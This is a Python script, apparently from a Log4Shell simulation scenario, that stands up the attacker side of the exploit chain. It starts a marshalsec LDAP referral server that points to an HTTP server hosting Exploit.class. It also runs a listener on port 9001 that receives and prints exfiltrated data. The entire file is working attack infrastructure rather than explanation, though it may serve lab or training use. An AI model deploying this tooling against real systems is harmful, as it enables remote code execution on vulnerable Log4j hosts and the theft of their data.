import http.server
import socketserver
import subprocess
import socket
import functools

# Config
LDAP_PORT = 1389
HTTP_PORT = 8000
LEAK_PORT = 9001
MARSHALSEC_JAR = "scenarios/log4shell/sim/marshalsec-0.0.3-SNAPSHOT-all.jar"
EXPLOIT_CLASS = "Exploit.class"
EXPLOIT_DIR = "scenarios/log4shell/sim"


def get_host_ip():
    """Get host IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def is_port_in_use(port, host='0.0.0.0'):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex((host, port)) == 0
    
def start_ldap_server():

    if is_port_in_use(LDAP_PORT):
        print(f"[!] LDAP port {LDAP_PORT} already in use. Assuming LDAPRefServer is running.")
        return None
    
    host_ip = get_host_ip()
    print(f"HOST IP: {host_ip}")
    """Start the LDAPRefServer."""
    url = f"http://{host_ip}:{HTTP_PORT}/#Exploit"
    cmd = [
        "java",
        "-cp",
        MARSHALSEC_JAR,
        "marshalsec.jndi.LDAPRefServer",
        url
    ]
    print(f"[+] Starting LDAPRefServer with redirect to {url}")
    return subprocess.Popen(cmd)


def start_http_server():
    """Serve Exploit.class on HTTP."""
    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=EXPLOIT_DIR)
    with socketserver.TCPServer(("", HTTP_PORT), handler) as httpd:
        print(f"[+] Serving HTTP on 0.0.0.0:{HTTP_PORT}, serving from: {EXPLOIT_DIR}")
        httpd.serve_forever()


def start_leak_server():
    """Start a simple exfiltration log server on port 9001."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', LEAK_PORT))
        s.listen()
        print(f"[+] Leak server listening on port {LEAK_PORT}")
        while True:
            conn, addr = s.accept()
            with conn:
                data = conn.recv(4096)
                print(f"[!] Exfiltration from {addr[0]}:{addr[1]}:\n{data.decode(errors='ignore')}")